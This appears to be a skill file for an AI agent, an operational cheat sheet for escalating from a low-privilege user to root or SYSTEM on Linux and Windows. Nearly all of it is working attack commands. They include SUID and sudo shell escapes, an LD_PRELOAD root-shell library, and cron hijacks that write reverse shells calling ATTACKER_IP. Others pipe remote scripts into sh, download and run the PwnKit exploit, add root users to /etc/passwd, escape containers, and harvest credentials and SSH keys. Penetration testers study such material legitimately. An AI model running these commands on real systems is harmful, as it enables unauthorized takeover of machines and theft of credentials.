---
name: lpe
description: Local Privilege Escalation — Linux and Windows techniques to escalate from low-privilege user to root/SYSTEM
---

# Local Privilege Escalation (LPE)

After obtaining initial access (web shell, RCE, low-priv user), LPE is the path from limited user to root/SYSTEM. Always enumerate before exploiting.

## Quick Enumeration Checklist

```bash
# Who am I, what groups?
id; whoami; groups

# OS / kernel version
uname -a; cat /etc/os-release; cat /proc/version

# Sudo rights
sudo -l

# SUID/SGID binaries
find / -perm -4000 -o -perm -2000 2>/dev/null | grep -v proc

# Capabilities
getcap -r / 2>/dev/null

# Writable files/dirs in PATH
echo $PATH | tr ':' '\n' | xargs -I{} find {} -writable 2>/dev/null

# Cron jobs
cat /etc/crontab; ls -la /etc/cron.*; crontab -l 2>/dev/null
systemctl list-timers --all

# Network (internal services)
ss -tlnp; netstat -tlnp 2>/dev/null; cat /etc/hosts

# Processes running as root
ps aux | grep root

# Writable /etc/passwd
ls -la /etc/passwd /etc/shadow

# SSH keys
find / -name authorized_keys -o -name id_rsa -o -name id_ed25519 2>/dev/null

# Bash history / config files with credentials
cat ~/.bash_history; find / -name "*.conf" -o -name "*.env" -o -name ".env" 2>/dev/null | xargs grep -l "password\|passwd\|secret\|key" 2>/dev/null | head -20

# Docker group / socket
id | grep docker; ls -la /var/run/docker.sock 2>/dev/null
```

### Automation Tools (run first)

```bash
# LinPEAS - most comprehensive
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee /tmp/linpeas.txt

# LinEnum
curl -sL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh

# linux-exploit-suggester
curl -sL https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh
```

## SUID/SGID Abuse

```bash
# Find all SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Common exploitable SUIDs — check GTFOBins for each
# https://gtfobins.github.io/

# Examples:
# bash -p (if bash is SUID)
/bin/bash -p

# nmap (old versions)
nmap --interactive
!sh

# vim / vi
vim -c ':!/bin/sh'

# find
find . -exec /bin/sh -p \; -quit

# python / python3
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# awk
awk 'BEGIN {system("/bin/sh")}'

# cp (overwrite /etc/passwd)
cp /etc/passwd /tmp/passwd.bak
echo 'hacked::0:0:root:/root:/bin/bash' >> /etc/passwd
su hacked

# curl/wget (read files or write authorized_keys)
LFILE=/root/.ssh/authorized_keys
curl "file:///root/.ssh/id_rsa" -o /tmp/root_key
```

## Sudo Abuse

```bash
# Check what we can sudo
sudo -l

# Sudo without password (NOPASSWD)
# If listed: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# Sudo with env_keep (LD_PRELOAD abuse)
# If sudo preserves LD_PRELOAD:
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash -i");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so <any_sudo_allowed_command>

# Sudo wildcard abuse
# If: (root) NOPASSWD: /opt/scripts/*.sh
echo '/bin/bash' > /tmp/evil.sh; chmod +x /tmp/evil.sh
sudo /opt/scripts/../../../tmp/evil.sh

# Sudo specific app abuse (check GTFOBins)
sudo less /etc/passwd     # !bash inside less
sudo man man              # !bash inside man
sudo apt-get changelog apt  # !/bin/bash
sudo zip /tmp/1.zip /tmp/1 -T --unzip-command="sh -c /bin/bash"
```

## Cron Job Hijacking

```bash
# List all cron jobs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l

# Find writable scripts called by root cron
# If /etc/crontab has: * * * * * root /opt/scripts/backup.sh
ls -la /opt/scripts/backup.sh
# If writable:
echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /opt/scripts/backup.sh

# PATH injection in cron
# If cron runs: PATH=/home/user:/usr/local/sbin and calls "curl" without full path:
echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/curl
chmod +x /home/user/curl
# Wait for next cron execution
```

## Writable /etc/passwd

```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt xyz newpassword123
# or: python3 -c "import crypt; print(crypt.crypt('password123', '\$6\$salt\$'))"

# Add root user
echo 'hacker:$1$xyz$hash_here:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker  # password: newpassword123
```

## Kernel Exploits

```bash
# Get kernel version
uname -a
# Example: Linux victim 5.8.0-43-generic

# linux-exploit-suggester output guides this
# Common modern exploits:
# CVE-2022-0847 (DirtyPipe) — kernel 5.8–5.16.11
# CVE-2021-4034 (PwnKit) — pkexec LPE, almost all distros
# CVE-2016-5195 (DirtyCOW) — kernel < 4.8.3
# CVE-2023-0386 (OverlayFS) — kernel < 6.2

# PwnKit (fastest, very reliable):
curl -fsSL https://github.com/ly4k/PwnKit/raw/main/PwnKit -o /tmp/PwnKit
chmod +x /tmp/PwnKit && /tmp/PwnKit

# DirtyPipe (kernel 5.8–5.16):
# compile and run from https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

# General approach:
searchsploit "linux kernel $(uname -r | cut -d'-' -f1)"
```

## Linux Capabilities Abuse

```bash
getcap -r / 2>/dev/null
# Common dangerous capabilities:
# cap_setuid: python3, perl, ruby, node
# cap_net_raw: ping, tcpdump
# cap_dac_override: vim, nano (read any file)
# cap_sys_ptrace: allows ptrace (memory injection)

# cap_setuid on python3:
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# cap_net_raw on tcpdump → sniff traffic → capture credentials

# cap_dac_override on vim:
vim /etc/shadow  # read root hash
```

## Docker Escape

```bash
# Check if inside docker
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Check if privileged
cat /proc/self/status | grep CapEff
# If CapEff has all bits set (0000003fffffffff) → privileged

# Privileged escape via cgroup:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo "id > $host_path/output" >> /cmd
chmod a+x /cmd && sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output  # should show root

# Docker socket mounted
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash

# writable /etc/docker/ or docker group membership
id | grep docker
docker run --rm -v /:/mnt alpine chroot /mnt
```

## NFS no_root_squash

```bash
# On attacker machine:
showmount -e TARGET_IP
# If no_root_squash in /etc/exports:
mount -t nfs TARGET_IP:/exported/path /mnt/nfs
# Create SUID bash:
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# On victim:
/mnt/nfs/bash -p  # root shell
```

## Credential Harvesting (Linux)

```bash
# History files
cat ~/.bash_history ~/.zsh_history ~/.fish_history 2>/dev/null

# Config files
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name ".env" 2>/dev/null \
  | xargs grep -l -i "pass\|secret\|key\|token\|api" 2>/dev/null

# SSH private keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null

# Database credentials in web files
find /var/www /srv /opt -name "*.php" -o -name "*.py" -o -name "*.js" -o -name "*.env" 2>/dev/null \
  | xargs grep -l "DB_PASS\|database_password\|mysqli\|PDO" 2>/dev/null

# Memory dump for credentials
strings /proc/*/environ 2>/dev/null | grep -i "pass\|secret\|token"
```

## Windows LPE (Quick Reference)

```powershell
# Enumeration
whoami /priv; whoami /groups
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
Get-LocalUser; net user; net localgroup administrators

# Unquoted service paths
wmic service get name,displayname,pathname,startmode 2>nul | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Weak service permissions
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both =1: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > evil.msi; msiexec /quiet /qn /i evil.msi

# Stored credentials
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query HKLM /f password /t REG_SZ /s

# Token impersonation (PrintSpoofer, RoguePotato, GodPotato if SeImpersonatePrivilege)
whoami /priv | findstr SeImpersonatePrivilege
# PrintSpoofer64.exe -i -c powershell

# WinPEAS
.\winPEASx64.exe
```
